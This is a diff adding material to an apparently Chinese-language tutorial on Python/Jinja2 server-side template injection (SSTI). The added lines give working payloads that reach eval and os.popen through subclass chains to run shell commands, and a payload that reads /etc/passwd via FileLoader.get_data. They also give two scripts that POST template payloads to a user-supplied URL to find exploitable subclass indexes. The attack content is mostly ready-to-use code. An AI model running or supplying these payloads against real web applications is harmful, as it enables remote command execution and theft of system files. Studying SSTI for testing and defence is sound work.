@@ -90,6 +90,8 @@ print(c.__class__.__base__.__subclasses__()) #[<class '__main__.C'>, <class '__m
 print(c.__class__.__base__.__subclasses__()[1])#<class '__main__.D'>
 ```
 
+## 魔术方法
+
 _\_class__:查看当前类型的所属对象
 
 _\_base__:查看当前对象的父类
@@ -102,10 +104,67 @@ _\_subclassses__()[1]：查看当前父类下的第二个子类，0表示第一�
 
 _\_init__:查看是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
 
-_\_globals__:返回当前对象的全部全局变量
+_\_globals__:返回当前对象的全部全局变量，查看可以使用的函数
 
 _\_builtins__:提供对Python的所有内置标识符的直接访问
 
 eval()计算字符串表达式的值
 
 popen()：执行一个shell以运行命令来开启一个进程
+
+```python
+"".__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")
+```
+
+# 4.SSTI常用注入模板利用
+
+## 文件读取
+
+### _frozen_importlib_external.FileLoader
+
+文件读取类名：_frozen_importlib_external.FileLoader
+
+查找子类脚本
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
+    try:
+        response = requests.post(url,data=data)
+        #print(response)
+        if(response.status_code==200):
+            if'_frozen_importlib_external.FileLoader' in str(response.content):
+                print(i)
+    except:
+        pass
+
+```
+
+找到_frozen_importlib_external.FileLoader类名的位置
+
+{{""\.\_\_class__\.\_\_base\_\_\.\_\_subclasses\_\_[<font color=red>79</font>]\["get_data"](0,"/etc/passwd")}}
+
+### eval
+
+查找eval脚本
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"}
+    try:
+        response = requests.post(url,data=data)
+        #print(response)
+        if(response.status_code==200):
+            if'eval' in str(response.content):
+                print(i)
+    except:
+        pass
+
+
+
+```
+
